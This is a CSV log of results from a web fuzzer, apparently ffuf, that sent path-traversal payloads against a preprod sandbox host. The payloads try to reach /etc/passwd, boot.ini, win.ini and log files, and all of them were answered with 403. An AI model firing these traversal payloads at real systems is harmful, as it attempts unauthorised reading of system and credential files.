FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
..%5cetc/passwd,https://overlord-preprod-sandbox.officevibe.com/..%5cetc/passwd,,3444,403,312,17,7,text/html; charset=us-ascii,27.629972ms,
../config.js,https://overlord-preprod-sandbox.officevibe.com/../config.js,,3723,403,312,17,7,text/html; charset=us-ascii,27.94259ms,
../../../etc/passwd,https://overlord-preprod-sandbox.officevibe.com/../../../etc/passwd,,7190,403,312,17,7,text/html; charset=us-ascii,28.016967ms,
./../../../../../../../../../etc/passw*,https://overlord-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/passw*,,15139,403,312,17,7,text/html; charset=us-ascii,28.116998ms,
../../boot.ini,https://overlord-preprod-sandbox.officevibe.com/../../boot.ini,,15624,403,312,17,7,text/html; charset=us-ascii,28.744392ms,
../../../logs/error.log,https://overlord-preprod-sandbox.officevibe.com/../../../logs/error.log,,18451,403,312,17,7,text/html; charset=us-ascii,27.623507ms,
..///etc/passwd,https://overlord-preprod-sandbox.officevibe.com/..///etc/passwd,,19422,403,312,17,7,text/html; charset=us-ascii,29.358358ms,
file/../../../../../../../../etc,https://overlord-preprod-sandbox.officevibe.com/file/../../../../../../../../etc,,24603,403,312,17,7,text/html; charset=us-ascii,29.327497ms,
%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,https://overlord-preprod-sandbox.officevibe.com/%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwinnt%5cwin.ini,,28158,403,312,17,7,text/html; charset=us-ascii,28.686126ms,
./../../../../../../../../../etc/*,https://overlord-preprod-sandbox.officevibe.com/./../../../../../../../../../etc/*,,29065,403,312,17,7,text/html; charset=us-ascii,28.905606ms,
PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-preprod-sandbox.officevibe.com/PRN/../../../../../../../../../WINNT/system32/ipconfig.exe,,31774,403,312,17,7,text/html; charset=us-ascii,34.176193ms,
..%5c..%5c..%5c..%5c..%5cetc/passwd,https://overlord-preprod-sandbox.officevibe.com/..%5c..%5c..%5c..%5c..%5cetc/passwd,,33538,403,312,17,7,text/html; charset=us-ascii,28.198543ms,
ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,https://overlord-preprod-sandbox.officevibe.com/ca//\\../\\../\\../\\../\\../\\../\\windows/\\win.ini,,33654,403,312,17,7,text/html; charset=us-ascii,37.434956ms,
cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,https://overlord-preprod-sandbox.officevibe.com/cgi-bin/../../../../../../../../../../WINNT/system32/ipconfig.exe,,34140,403,312,17,7,text/html; charset=us-ascii,28.03217ms,
